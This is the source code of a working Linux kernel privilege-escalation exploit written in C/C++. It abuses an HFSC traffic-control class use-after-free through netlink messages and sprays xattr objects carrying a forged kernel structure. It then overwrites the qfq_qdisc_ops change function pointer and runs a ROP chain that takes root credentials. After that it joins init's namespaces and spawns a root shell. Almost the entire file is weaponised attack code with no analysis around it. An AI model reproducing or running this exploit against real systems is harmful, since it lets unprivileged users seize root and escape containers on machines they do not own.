#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sched.h>
#include <errno.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <sys/syscall.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/if_arp.h>

#include <cassert>
#include <target/TargetDb.hpp>
#include <test/kpwn/Kpwn.cpp>
#include <util/incbin.hpp>
#include <util/syscalls.cpp>
#include <util/error.cpp>
#include <util/pwn_utils.cpp>
#include <payloads/Payload.hpp>
#include <util/HexDump.cpp>
#include <util/ArgumentParser.cpp>
#include <pivot/PivotFinder.cpp>
#include <pivot/StackPivot.cpp>

/* simple_xattr spray */
const int xattr_spray = 32;
int xattr_header_size;
const int xattr_slab_len = 1024;
const int xattr_data_len = xattr_slab_len/2;

/* hfsc_class offsets */
int level_offset;
int cl_parent_offset;
int vt_node_offset;
int cf_node_offset;
int cl_vt_offset;
int cl_cvtmin_offset;

/* Data offsets */
int qfq_change_qdisk_loc;

#define err_exit(s) do { perror(s); exit(EXIT_FAILURE); } while(0)

INCBIN(target_db, "target_db.kpwn");

struct tf_msg {
    struct nlmsghdr nh;
    struct tcmsg tm;
#define TC_DATA_LEN 512
    char attrbuf[TC_DATA_LEN];
};

struct if_msg {
    struct nlmsghdr nh;
    struct ifinfomsg ifi;
};

/* Netlink message for setting loopback up. */
struct if_msg if_up_msg = {
    {
        .nlmsg_len = 32,
        .nlmsg_type = RTM_NEWLINK,
        .nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
    },
    {
        .ifi_family = AF_UNSPEC,
        .ifi_type = ARPHRD_NETROM,
        .ifi_index = 1,
        .ifi_flags = IFF_UP,
        .ifi_change = 1,
    },

};

int xattr_fd;

void pin_cpu (int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set))
        err_exit("[-] sched_setaffinity");
}

/* Helper functions for creating rtnetlink messages. */

unsigned short add_rtattr (struct rtattr *rta, unsigned short type, unsigned short len, const void *data) {
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    return rta->rta_len;
}

int vuln_class_id = 0x00010001; // 1:1, classid of vulnerable RSC parent.
int def_class_id = 0x00010002; // 1:2, classid where packets are enqueued.
struct tf_msg newqd_msg, newc_msg, delc_msg, new_rsc_msg, new_fsc_msg, new_qfq_qdisc;

void init_tf_msg (struct tf_msg *m) {
    m->nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    m->tm.tcm_family = PF_UNSPEC;
    m->tm.tcm_ifindex = if_nametoindex("lo");
    m->nh.nlmsg_len = NLMSG_LENGTH(sizeof(m->tm));
    m->tm.tcm_parent = TC_H_MAKE(1 << 16, 0);
    m->tm.tcm_info = TC_H_MAKE(1 << 16, 3 << 8); //(prio << 16, protocol << 8)
    m->nh.nlmsg_seq = 1;
}

void init_qdisc_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWQDISC;
    m->tm.tcm_parent = -1;
    m->tm.tcm_handle = 1 << 16;
    m->tm.tcm_info = 0;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    struct rtattr *opts = (rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len));
    short def = 2;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_OPTIONS, 2, &def));
}


void init_rsc_class_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWTCLASS;
    m->tm.tcm_parent = 1 << 16;
    m->tm.tcm_handle = vuln_class_id;
    m->tm.tcm_info = 0;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    struct rtattr *opts = (rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len));
    opts->rta_type = TCA_OPTIONS;
    opts->rta_len = RTA_LENGTH(0);
    int rsc[3] = {1, 1, 1};
    opts->rta_len += RTA_ALIGN(add_rtattr((rtattr *)((char *)opts + opts->rta_len), TCA_HFSC_RSC, sizeof(rsc), rsc));
    m->nh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
}

void init_fsc_class_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWTCLASS;
    m->tm.tcm_parent = vuln_class_id;
    m->tm.tcm_handle = def_class_id;
    m->tm.tcm_info = 0;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_KIND, strlen("hfsc") + 1, "hfsc"));
    struct rtattr *opts = (rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len));
    opts->rta_type = TCA_OPTIONS;
    opts->rta_len = RTA_LENGTH(0);
    int fsc[3] = {1, 1, 1};
    opts->rta_len += RTA_ALIGN(add_rtattr((rtattr *)((char *)opts + opts->rta_len), TCA_HFSC_FSC, sizeof(fsc), fsc));
    m->nh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
}

void init_del_class_msg (struct tf_msg *m) {
    init_tf_msg(m);
    m->nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    m->nh.nlmsg_type = RTM_DELTCLASS;
    m->tm.tcm_handle = vuln_class_id;
}

void init_qfq_qdisc_msg (struct tf_msg *m, const Payload& payload) {
    init_tf_msg(m);
    m->nh.nlmsg_type = RTM_NEWQDISC;
    m->tm.tcm_parent = 0x00010002;
    m->tm.tcm_handle = 2 << 16;
    m->tm.tcm_info = 0;
    m->nh.nlmsg_flags |= NLM_F_CREATE;
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_KIND, strlen("qfq") + 1, "qfq"));
    auto data = payload.GetUsedData();
    m->nh.nlmsg_len += NLMSG_ALIGN(add_rtattr((rtattr *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len)), TCA_OPTIONS, data.size() - 4, data.data() + 4));
}

void init_nl_msgs (void) {
    init_qdisc_msg(&newqd_msg);
    init_del_class_msg(&delc_msg);
    init_rsc_class_msg(&new_rsc_msg);
    init_fsc_class_msg(&new_fsc_msg);
}

/*
 * Send a Netlink message and check for error
 */
void netlink_write (int sock, struct tf_msg *m) {
    struct {
        struct nlmsghdr nh;
        struct nlmsgerr ne;
    } ack;
    if (write(sock, m, m->nh.nlmsg_len) == -1)
        err_exit("[-] write");
    if (read(sock , &ack, sizeof(ack)) == -1)
        err_exit("[-] read");
    if (ack.ne.error) {
        errno = -ack.ne.error;
        perror("[-] netlink");
    }
}

void netlink_write_noerr (int sock, struct tf_msg *m) {
    if (write(sock, m, m->nh.nlmsg_len) == -1)
        err_exit("[-] write");
}

/*
 * Send a message on the loopback device. Used to trigger qdisc enqueue and
 * dequeue functions.
 */
void loopback_send (void) {
    struct sockaddr iaddr = { AF_INET };
    int inet_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);
    if (inet_sock_fd == -1)
        err_exit("[-] inet socket");
    if (connect(inet_sock_fd, &iaddr, sizeof(iaddr)) == -1)
        err_exit("[-] connect");
    if (write(inet_sock_fd, "", 1) == -1)
        err_exit("[-] inet write");
    close(inet_sock_fd);
}

int main (int argc, char **argv) {
    long kernel_base;

    TargetDb kpwn_db(target_db, target_db_size);
    auto target = kpwn_db.AutoDetectTarget();
    printf("[+] Running on target: %s %s\n", target.distro.c_str(), target.release_name.c_str());

    pin_cpu(0);

    if (argc > 1) {
        kernel_base = strtoul(argv[1], NULL, 16);
        printf("[*] Using provided kernel base: %p\n", kernel_base);
    } else {
        printf("[*] Kernel base is not provided!!!\n");
        exit(EXIT_FAILURE);
    }

    auto structs = target.structs;

    xattr_header_size = structs["simple_xattr"].size;
    printf("[+] xattr_header_size: %d\n", xattr_header_size);

    char xattr_buf[xattr_data_len];

    level_offset = structs.at("hfsc_class").fields.at("level").offset;
    printf("[+] level_offset: %d\n", level_offset);

    cl_parent_offset = structs.at("hfsc_class").fields.at("cl_parent").offset;
    printf("[+] cl_parent_offset: %d\n", cl_parent_offset);

    vt_node_offset = structs.at("hfsc_class").fields.at("vt_node.__rb_parent_color").offset;
    printf("[+] vt_node_offset: %d\n", vt_node_offset);

    cf_node_offset = structs.at("hfsc_class").fields.at("cf_node.__rb_parent_color").offset;
    printf("[+] cf_node_offset: %d\n", cf_node_offset);

    cl_vt_offset = structs.at("hfsc_class").fields.at("cl_vt").offset;
    printf("[+] cl_vt_offset: %d\n", cl_vt_offset);

    cl_cvtmin_offset = structs.at("hfsc_class").fields.at("cl_cvtmin").offset;
    printf("[+] cl_cvtmin_offset: %d\n", cl_cvtmin_offset);

    /* Data offsets */
    qfq_change_qdisk_loc = target.GetSymbolOffset("qfq_qdisc_ops") + structs.at("Qdisc_ops").fields.at("change").offset;
    printf("[+] qfq_change_qdisk_loc: 0x%x\n", qfq_change_qdisk_loc);

    check_kaslr_base(kernel_base);

    if (unshare(CLONE_NEWUSER) == -1)
        err_exit("[-] unshare(CLONE_NEWUSER)");
    if (unshare(CLONE_NEWNET) == -1)
        err_exit("[-] unshare(CLONE_NEWNET)");

    /* Open temporary file to use for xattr spray */
    xattr_fd = open("/tmp/", O_TMPFILE | O_RDWR, 0664);
    if (xattr_fd == -1)
        err_exit("[-] open");

    /* Open socket to send netlink commands to */
    int nl_sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (nl_sock_fd == -1)
        err_exit("[-] nl socket");

    /* Set loopback device up */
    if_up_msg.ifi.ifi_index = if_nametoindex("lo");
    netlink_write(nl_sock_fd, (tf_msg *)&if_up_msg);

    init_nl_msgs();

    /* Trigger vuln */
    netlink_write(nl_sock_fd, &newqd_msg);
    netlink_write(nl_sock_fd, &new_rsc_msg);
    netlink_write(nl_sock_fd, &new_fsc_msg);
    loopback_send();
    delc_msg.tm.tcm_handle = def_class_id;
    netlink_write(nl_sock_fd, &delc_msg);

    printf("[+] ROP chain:\n");
    RopChain rop(target, kernel_base);
    rop.AddRopAction(RopActionId::COMMIT_KERNEL_CREDS);
    rop.AddRopAction(RopActionId::SWITCH_TASK_NAMESPACES, {1});
    rop.AddRopAction(RopActionId::TELEFORK, {100000});
    HexDump::Print(rop.GetData());

    Payload payload(256);
    payload.Reserve(0, 4);

    PivotFinder pivot_finder(target.pivots, Register::RSI, payload);
    auto rop_pivot = pivot_finder.PivotToRop(rop);
    rop_pivot.PrintDebugInfo();

    printf("[+] Payload:\n");
    HexDump::Print(payload.GetUsedData());

    /* Place fake hfsc_class in xattr */

    /* hfsc_class.level = 1 (must be non-zero) */
    xattr_buf[level_offset - xattr_header_size] = 1;
    /* hfsc_class.vt_node = 1 (must be odd) */
    xattr_buf[vt_node_offset - xattr_header_size] = 1;
    /* hfsc_class.cf_node = 1 (must be odd) */
    xattr_buf[cf_node_offset - xattr_header_size] = 1;
    /* hfsc_class.parent = &qfq_change_qdisc (write target)*/
    long parent = kernel_base + qfq_change_qdisk_loc - cl_cvtmin_offset;
    memcpy(xattr_buf + cl_parent_offset - xattr_header_size, &parent, 8);
    /* hfsc_class.cl_vt = jop_gadget (write value) */
    long cl_vt = kernel_base + rop_pivot.pivot.GetGadgetOffset();
    printf("[*] cl_vt: 0x%lx\n", cl_vt);

    memcpy(xattr_buf + cl_vt_offset - xattr_header_size, &cl_vt, 8);

    printf("[*] Spraying simple_xattrs...\n");
    /* Spray simple_xattrs */
    delc_msg.tm.tcm_handle = vuln_class_id;
    netlink_write(nl_sock_fd, &delc_msg);

    /* Allocate simple_xattr objects */
    char name[32];
    for (int i = 0; i < xattr_spray; i++) {
        sprintf(name, "security.%d", i);
        if (fsetxattr(xattr_fd, name, xattr_buf, xattr_data_len, 0) == -1)
            err_exit("[-] fsetxattr");
    }

    /* Create new default class and trigger enqueue/dequeue to overwrite
     * qfq_change_qdisc with jop gadget */
    new_fsc_msg.tm.tcm_parent = 1 << 16;
    netlink_write(nl_sock_fd, &new_fsc_msg);

    printf("[*] Overwriting function pointer\n");
    loopback_send();

    /* Call overwritten function pointer */
    init_qfq_qdisc_msg(&new_qfq_qdisc, payload);
    netlink_write_noerr(nl_sock_fd, &new_qfq_qdisc);
    printf("[*] Triggering ROP chain\n");
    netlink_write_noerr(nl_sock_fd, &new_qfq_qdisc);

    if (getuid()) {
        printf("[-] Privesc failed\n");
        exit(EXIT_FAILURE);
    }

    printf("[+] Returned from ROP\n");

    int mntns_fd = open("/proc/1/ns/mnt", O_RDONLY);
    if (mntns_fd == -1)
        perror("[-] open(/proc/1/ns/mnt)");

    int netns_fd = open("/proc/1/ns/net", O_RDONLY);
    if (netns_fd == -1)
        perror("[-] open(/proc/1/ns/net)");

    int pidns_fd = open("/proc/1/ns/pid", O_RDONLY);
    if (pidns_fd == -1)
        perror("[-] open(/proc/1/ns/pid)");

    if (setns(mntns_fd, CLONE_NEWNS) == -1)
        perror("[-] setns mnt");
    if (setns(netns_fd, CLONE_NEWNET) == -1)
        perror("[-] setns net");
    if (setns(pidns_fd, CLONE_NEWPID) == -1)
        perror("[-] setns pid");

    printf("[*] Launching shell\n");
    system("/bin/sh");
}
